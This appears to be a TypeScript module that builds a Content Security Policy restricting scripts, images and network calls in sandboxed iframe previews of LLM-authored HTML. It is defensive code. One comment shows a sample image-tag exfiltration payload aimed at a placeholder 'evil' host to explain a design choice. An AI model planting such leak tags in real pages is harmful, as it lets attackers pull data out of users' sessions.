// CSP whitelist applied to HTML files previewed in the Files
// explorer iframe. We ship a narrow list of trusted CDNs that the
// LLM commonly pulls from (Chart.js, D3, Tailwind, etc. via
// jsdelivr / unpkg / cdnjs) plus Google Fonts. Anything else —
// random `https://` origins, phone-home `fetch()` calls, etc. —
// is rejected.
//
// Widen by editing `HTML_PREVIEW_CSP_ALLOWED_CDNS` below. Keep the
// list audited — every entry is a potential supply-chain surface.

export const HTML_PREVIEW_CSP_ALLOWED_CDNS: readonly string[] = [
  "https://cdn.jsdelivr.net",
  "https://unpkg.com",
  "https://cdnjs.cloudflare.com",
  "https://fonts.googleapis.com",
  "https://fonts.gstatic.com",
];

/**
 * Build the CSP string. Split from the wrapper so tests can exercise
 * the policy without HTML-template noise.
 *
 * `origin`, when provided, replaces `'self'` in `img-src`. The preview
 * iframe is `sandbox="allow-scripts"` only, so its document has an
 * opaque origin: Safari/WebKit matches `'self'` against the (opaque)
 * origin tuple and rejects every same-origin image request. Chrome
 * matches `'self'` against the document URL and works either way. Pass
 * the explicit server origin from HTTP-header callers; leave it
 * undefined for the `srcdoc` fallback (where `'self'` is meaningless
 * either way and there are no same-origin refs to resolve).
 */
export function buildHtmlPreviewCsp(origin?: string, cdns: readonly string[] = HTML_PREVIEW_CSP_ALLOWED_CDNS): string {
  const cdnList = cdns.join(" ");
  const imgSelf = origin ?? "'self'";
  return [
    "default-src 'none'",
    // LLM-authored HTML almost always uses inline <script> blocks
    // alongside the CDN load. No feasible path to avoid
    // 'unsafe-inline' without rewriting every output.
    `script-src 'unsafe-inline' ${cdnList}`,
    `style-src 'unsafe-inline' ${cdnList}`,
    `font-src ${cdnList}`,
    // Images: same-origin (workspace files via /api/files/raw), CDN
    // whitelist, plus data: and blob: for inline PNGs and dynamically-
    // generated charts. Wildcard is deliberately avoided — an attacker
    // who plants an <img src="https://evil/?leak="> in preview HTML
    // could exfiltrate data via image requests even with connect-src
    // blocked. Widen via HTML_PREVIEW_CSP_ALLOWED_CDNS if LLM output
    // legitimately needs more hosts.
    `img-src ${imgSelf} ${cdnList} data: blob:`,
    // Block XHR / fetch / WebSocket so previews can't phone home or
    // exfiltrate anything the inline scripts happen to compute.
    "connect-src 'none'",
  ].join("; ");
}

/**
 * Build the CSP string for the print-mode hidden iframe (presentHtml's
 * printToPdf). Same policy as the preview header with the explicit
 * server origin substituted for `'self'` — see `buildHtmlPreviewCsp`
 * for why the substitution is required.
 */
export function buildPrintCspContent(origin: string, cdns: readonly string[] = HTML_PREVIEW_CSP_ALLOWED_CDNS): string {
  return buildHtmlPreviewCsp(origin, cdns);
}

const CSP_META_NONCE = ""; // reserved for future use (per-render nonce)

/**
 * Inject a `<meta http-equiv="Content-Security-Policy">` tag into the
 * HTML head. If the HTML has no `<head>`, wrap it as a full document
 * with a synthetic head so the meta tag is honoured regardless.
 *
 * Pure — doesn't touch the DOM. Safe to use from both client and
 * tests.
 */
export function wrapHtmlWithPreviewCsp(html: string): string {
  const csp = buildHtmlPreviewCsp();
  const meta = `<meta http-equiv="Content-Security-Policy" content="${csp}">`;
  if (/<head\b[^>]*>/i.test(html)) {
    return html.replace(/(<head\b[^>]*>)/i, `$1${meta}`);
  }
  // No <head> — treat as fragment and wrap it.
  return `<!DOCTYPE html><html><head>${meta}</head><body>${html}</body></html>${CSP_META_NONCE}`;
}
